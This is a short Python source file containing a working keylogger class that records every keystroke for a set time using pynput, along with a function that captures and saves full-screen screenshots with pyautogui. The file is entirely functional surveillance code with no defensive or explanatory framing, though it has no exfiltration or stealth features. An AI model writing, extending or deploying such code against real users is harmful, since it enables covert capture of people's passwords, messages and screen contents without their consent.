from pynput.keyboard import Listener
import datetime
import pyautogui

class Keylogger():
    def __init__ (self, time):
        self.__log = ""
        self.__start = 1
        self.__time = time
    def setTime(self, value):
        self.__time = value    
    def keyLogger(self):
        self.__start = datetime.datetime.now()
        def anonymous(key):
            now = datetime.datetime.now()
            key = str(key)
            if now.timestamp() - self.__start.timestamp() >= self.__time:
                listener.stop()
            if key == "Key.space":
                key = " "
            if key == "Key.enter":
                key = "\n"
            if key != "Key.backspace":
                key = key.replace("'","")
                self.__log += key
            else:
                self.__log = self.__log[:-1]

        with Listener (on_press=anonymous) as listener:
            listener.join()
            
    def getResult(self):
        return self.__log

def screenshot(): 
    # Get the current date and time to use in the screenshot filename
    now = datetime.datetime.now()
    timestamp = now.strftime("%Y-%m-%d %H-%M-%S")

    # # Specify the filename for the screenshot
    screenshot_filename = f"screenshot_{timestamp}.png"

    # # Take a screenshot of the entire screen and save it
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_filename)

    print(f"Screenshot saved as {screenshot_filename}")